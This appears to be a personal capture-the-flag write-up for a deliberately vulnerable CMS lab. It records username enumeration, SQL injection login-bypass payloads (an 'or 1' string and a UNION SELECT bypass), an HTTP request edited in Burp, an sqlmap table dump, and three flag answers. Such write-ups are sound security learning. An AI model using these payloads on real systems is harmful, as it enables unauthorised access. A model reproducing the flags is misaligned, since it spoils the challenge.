**Analysis:** 

Has an updated message about fixing security flaws with the last CMS room.

_This version fixed the multitude of security flaws and general functionality bugs that plagued v1. Additionally, we added user authentication; we're still not sure why we didn't think about that the first time, but hindsight is 20/20. By default, users need to be an admin to add or edit pages now._

- Need to be admin to edit pages.
- Can not access anything without getting into the login page.
- Doesn't seem to be anything in the source code.
- Looks like it has the same floor as one of the earlier rooms, it verifies if a user exists or not, and returns a message letting you know if the user exists in the system or not which is information disclosure. 

![[Pasted image 20240906115934.png]]

- I'm not completely sure, but i think i found the username `thomasine`. After trying it it gives me a security risk error, but i think that could be because the password is not enumerated yet, so i'll try that now with the new username. 

`Unable to connect to backend store.`

Finally found a username that works. After a while i tried an SQL injection attack which is what worked, now i can just enumerate the password and finally get into the app. 

Payload:
`' or 1 --'`

I find the password using owaspzap:

![[Pasted image 20240906134315.png]]

**Username:** ' or 1 --'
**Password:** leandro

Flag1:

`^FLAG^365711bf239e3112a9a624e33f8067d53584347a16ebb04f91ed917a25ac87e2$FLAG$`

- While trying to edit the page the app will redirect back to the first flag when i enter the SQL user/pass.
- I try manually editing the request in burp to try and access the edit page.

**Vulnerable request:**

`POST /page/edit/1 HTTP/2`

**Flag2:**

`^FLAG^c71c1119b382b4f980d44f784dd65032b611f7320520e70edce1470e35dea11e$FLAG$`

![[Pasted image 20240907045651.png]]

**Bypass login:**

User:
```php
' UNION SELECT '123' AS password#
```

`SELECT password FROM admins WHERE username='admin' UNION SELECT '123' AS password#`

Pass:
```php
123
```

**Flag3:**

`^FLAG^ee822791773d6ecd8864420c02e2d9801ee0cc813911828960392116c49f93d7$FLAG$`


![[Pasted image 20240907054315.png]]

---

**Completed:** _05:43 2024-09-07_

_Extra_
Finding the username, for the password we found earlier, with sqlmap.

```php
sqlmap -r req.txt -D level2 -T admins --dump
```

```php
+----+----------+----------+
| id | password | username |
+----+----------+----------+
| 1  | leandro  | patria   |
+----+----------+----------+
```


